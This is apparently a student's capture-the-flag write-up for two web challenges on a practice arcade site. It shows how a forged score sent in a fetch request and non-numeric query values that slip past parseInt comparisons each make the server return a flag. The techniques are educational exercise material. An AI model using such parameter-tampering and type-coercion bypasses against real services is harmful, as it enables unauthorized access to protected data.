# Retrieving Flags from the Geriatric Gamblers' Website

These are my solutions to flags #1 and #2 from the first CTF league meeting.

## Retrieving Flag #1 from the Breakout Game

First, after entering the breakout game, I opened the sources tab in the web developer console and searched for the text "flag" in index.js. This showed me the following code snippet:

```javascript
try {
    // Send the guess to the /raffle endpoint
    const response = await fetch(`/breakout?score=${score}`);
    // Check if the request was successful
    if (!response.ok) {
        throw new Error("Error contacting the server. Please try again.");
    }
    let flag = await response.text()
    console.log(flag)
    alert("You win!: " + flag);
} catch (error) {
    alert("You were supposed to get the flag but we broke something. sorry, tell a coach lol.");
}
```

This code shows that the flag is retrieved from the backend using a fetch request, with the syntax for it provided. Checking the backend code, I found the snippet that indicates the score to win: anything equal to or above 30 points.

```javascript
if (score >= 5 * 6) {
    res.send(process.env.BRICK_FLAG);
}
```

All that was left was to enter the frontend console and input the following fetch command:

```javascript
fetch('/breakout?score=30').then(res => res.text()).then(flag => console.log(flag));
```

This printed the flag onto the console.

## Retrieving Flag #2 from the Raffle Game

After entering the raffle game, I opened the sources tab in the web console and checked for the text "flag" in index.js. I encountered it in this function:

```javascript
async function loadSlots(a, b, c, d, e) {
    let response = await fetch(`/raffle?field1=${a}&field2=${b}&field3=${c}&field4=${d}&field5=${e}`);
    let results = await response.json()
    let slots = Array(numSlots).fill().map((element, index) => ({
        yOffset: 0,
        targetIcon: results.winningDigits[index],
        spinning: true,
        speed: slotSpeed,
        spinCount: index
    }));
    flag = results.flag
    return slots;
}
```

This told me to check the backend for a response to the "/raffle" query, where I found this:

```javascript
app.get('/raffle', (req, res) => {
    const guesses = req.query;
    let digits = Array.from({length: 5}, () => Math.floor(Math.random() * 10));

    // Make sure that the guess exists and isn't too high or too low
    if (!guesses.field1 || parseInt(guesses.field1) > digits[0] || parseInt(guesses.field1) < digits[0]) {
        res.send( { winningDigits: digits, flag: 'No flag 4 u!'})
    }
    else if (!guesses.field2 || parseInt(guesses.field2) > digits[1] || parseInt(guesses.field2) < digits[1]) {
        res.send( { winningDigits: digits, flag: 'No flag 4 u!'})
    }
    else if (!guesses.field3 || parseInt(guesses.field3) > digits[2] || parseInt(guesses.field3) < digits[2]) {
        res.send( { winningDigits: digits, flag: 'No flag 4 u!'})
    }
    else if (!guesses.field4 || parseInt(guesses.field4) > digits[3] || parseInt(guesses.field4) < digits[3]) {
        res.send( { winningDigits: digits, flag: 'No flag 4 u!'})
    }
    else if (!guesses.field5 || parseInt(guesses.field5) > digits[4] || parseInt(guesses.field5) < digits[4]) {
        res.send( { winningDigits: digits, flag: 'No flag 4 u!'})
    }
    else {
        res.send( { winningDigits: digits, flag: process.env.SLOTS_FLAG})
    }
});
```

I immediately noticed that it would be impossible to use a fetch request to retrieve the winning numbers and write them in, as they would be rerolled by the function itself each time. Instead, I decided to run the query from the URL directly like this: <https://arcade.ctf-league.osusec.org/raffle?field1=true&field2=true&field3=true&field4=true&field5=true>. By placing boolean values into the function expecting to receive integer values, I forced the function to fail each case expecting to parse integer values, leaving it to execute the final else clause and print the flag on the screen.
